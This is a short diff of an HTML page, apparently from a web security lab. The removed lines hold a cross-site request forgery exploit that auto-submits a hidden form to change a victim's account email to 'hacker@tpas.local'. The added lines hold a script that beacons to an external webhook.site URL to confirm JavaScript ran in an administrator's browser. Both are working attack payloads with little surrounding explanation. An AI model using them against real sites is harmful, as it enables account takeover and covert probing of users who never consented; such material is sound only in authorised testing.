@@ -2,20 +2,15 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Exploit</title>
+    <title>JavaScript Test</title>
 </head>
 <body>
-    <form id="exploitForm"
-          action="http://100.101.228.35:6009/settings/email"
-          method="GET">
-
-        <input type="hidden"
-               name="new"
-               value="hacker@tpas.local">
-    </form>
+    <h1>JavaScript test</h1>
 
     <script>
-        document.getElementById('exploitForm').submit();
+        const beacon = new Image();
+        beacon.src =
+            "https://webhook.site/512d09d8-ca70-48f6-a34d-87177c0c18c1?test=admin-js-executed";
     </script>
 </body>
 </html>
